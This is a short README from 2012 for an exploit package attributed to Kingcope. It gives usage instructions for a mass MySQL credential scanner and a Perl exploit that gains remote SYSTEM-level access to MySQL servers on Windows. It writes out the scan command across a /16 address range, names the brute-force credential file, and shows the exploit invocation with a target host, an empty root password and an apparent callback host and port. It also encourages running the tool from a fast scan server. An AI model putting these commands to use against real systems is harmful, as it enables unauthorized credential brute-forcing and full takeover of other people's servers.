MySQL Scanner & MySQL Server for Windows Remote SYSTEM Level Exploit
Version 1.0
By Kingcope
In the Year of 2012

use this on a fast scan server!

How to use.
pnscan:

the file "accounts" holds the user/password combinations to try.
hits are saved in the file "jack.pot".

#make lnx
#./pnscan 192.168.0.0/16 3306

exploit:
#perl mysql_win_remote.pl 192.168.2.100 root "" 192.168.2.150 5555

user root on windows will mostly succeed.

/Kingcope
